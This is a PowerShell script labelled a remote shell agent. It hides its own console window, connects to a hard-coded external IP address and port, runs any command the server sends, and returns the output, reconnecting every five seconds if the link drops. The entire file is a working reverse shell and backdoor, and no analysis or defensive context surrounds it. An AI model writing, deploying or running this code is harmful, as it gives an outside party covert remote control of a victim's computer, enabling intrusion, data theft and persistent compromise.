# Remote Shell Agent - Connects to server and executes commands
# Add -WindowStyle Hidden when running: powershell -WindowStyle Hidden -File agent.ps1

$ServerIP = "31.56.209.67"
$ServerPort = 8921
$ReconnectDelay = 5

# Hide the PowerShell window
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0) | Out-Null

while ($true) {
    try {
        Write-Host "`n[$(Get-Date -Format 'HH:mm:ss')] Connecting to server..." -ForegroundColor Yellow
        
        $client = New-Object System.Net.Sockets.TcpClient
        $client.Connect($ServerIP, $ServerPort)
        $stream = $client.GetStream()

        Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Connected to server!" -ForegroundColor Green

        while ($client.Connected) {
            $buffer = New-Object byte[] 4096
            $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
            
            if ($bytesRead -eq 0) { 
                Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Server closed connection" -ForegroundColor Yellow
                break 
            }

            $command = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $bytesRead).Trim()
            
            if ($command -eq "exit") {
                Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Exit command received" -ForegroundColor Yellow
                break
            }

            Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Executing: $command" -ForegroundColor White

            try {
                # Execute command in PowerShell explicitly
                $output = powershell.exe -NoProfile -Command $command 2>&1 | Out-String
                if ([string]::IsNullOrWhiteSpace($output)) {
                    $output = "Command executed successfully (no output)"
                }
            } catch {
                $output = "ERROR: $($_.Exception.Message)"
            }

            $responseBytes = [System.Text.Encoding]::UTF8.GetBytes($output)
            $stream.Write($responseBytes, 0, $responseBytes.Length)
        }

        $stream.Close()
        $client.Close()

    } catch {
        Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Connection failed: $($_.Exception.Message)" -ForegroundColor Red
    }

    Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Reconnecting in $ReconnectDelay seconds..." -ForegroundColor Yellow
    Start-Sleep -Seconds $ReconnectDelay
}
